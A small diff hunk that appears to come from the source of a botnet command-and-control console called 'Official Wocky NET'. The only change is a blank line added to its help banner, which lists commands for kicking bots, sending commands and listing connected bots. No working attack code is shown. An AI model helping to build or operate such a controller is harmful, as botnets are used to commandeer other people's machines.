@@ -8,6 +8,7 @@ banner = """                              Official Wocky NET
      - Official bot testing CNC
      _______________________________________________________________
          COMMANDS               USAGE               DESCRIPTION
+         
          - kick                 kick <SID>          kick bot
          - cmd                  cmd <cmd>           send a cmd to server
          - bots                 bots                list of bots
